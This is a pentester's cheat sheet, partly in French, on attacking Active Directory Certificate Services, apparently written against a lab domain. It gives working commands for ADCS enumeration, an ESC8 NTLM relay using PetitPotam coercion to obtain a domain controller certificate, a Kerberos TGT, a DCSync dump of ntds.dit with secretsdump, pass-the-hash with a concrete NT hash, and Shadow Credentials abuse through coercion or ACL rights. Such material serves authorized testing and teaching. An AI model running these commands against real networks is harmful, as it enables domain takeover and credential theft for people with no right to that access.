# ADCS

https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/
# Enumeration

**Sans credentials (réseau) :**
```bash
# ADCS expose des interfaces web par défaut
curl -k https://dc.domain.local/certsrv
nmap -p 443,80 --script http-title <dc_ip>
```

**Avec credentials (LDAP) :**
```bash
certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1
```

Certipy interroge LDAP et cherche des objets dans :

```
CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
```

Si un objet `pKIEnrollmentService` existe → ADCS est présent.

**NetExec**
```bash
netexec ldap domain.lab -u username -p password -M adcs
```

**ldapsearch**
```bash
ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
```

# ESC8 - coerce to domain admin

Pré-requis :

* ADCS running on the domain with web enrollment enabled.
* A working coerce method (here we use petitpotam unauthent, but an authenticated printerbug or other coerce methods will work the same)
* There is a useful template to exploit ESC8, by default on an active directory, its name is _DomainController_

Let’s check if the web enrollement is up and running at : http://192.168.56.23/certsrv/certfnsh.asp

Add a listener to relay SMB authentication to HTTP with impacket ntlmrelayx

```bash
ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Launch the coerce with petitpotam unauthenticated (this will no more work on an up to date active directory but other coerce methods authenticated will work the same). ntlmrelayx will relay the authentication to the web enrollement and get the certificate

```bash
python PetitPotam.py <LOCAL_IP> <SRV_IP_TO_COERCE>
```

Ask for a TGT with the certificate we just get

```bash
python gettgtpkinit.py -cert-pfx MACHINE\$.pfx domain.com/machine$ 'machine.ccache'
```

And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/machine.ccache
nxc smb meereen.essos.local -k --use-kcache
nxc smb meereen.essos.local -k --use-kcache --ntds
secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

Se connecter avec pass-the-hash

```bash
nxc smb meereen.essos.local -u 'Administrateur' -H '4dcaa3baa4c8eddca29e2793490fc9b8'
```

# Shadow Credentials

![shadow_credentials](img/shadow_creds.png)

The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT. Active Directory user and computer objects have an attribute called `msDS-KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.  There are multiple scenarios where an attacker can have control over an account that has the ability to edit the `msDS-KeyCredentialLink` (a.k.a. "kcl") attribute of other objects (e.g. member of a [special group](https://www.thehacker.recipes/ad/movement/builtins/security-groups), has [powerful ACEs](https://www.thehacker.recipes/ad/movement/dacl/), etc.). This allows attackers to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object (can be a user or a computer).

## Coerce method

```bash
ntlmrelayx.py -t ldaps://192.168.56.12 --remove-mic -smb2support --shadow-credentials
```

```bash
python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
```

```bash
python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
```

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
```

## ACL exploit method

```bash
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
```

```bash
python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
```

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
```
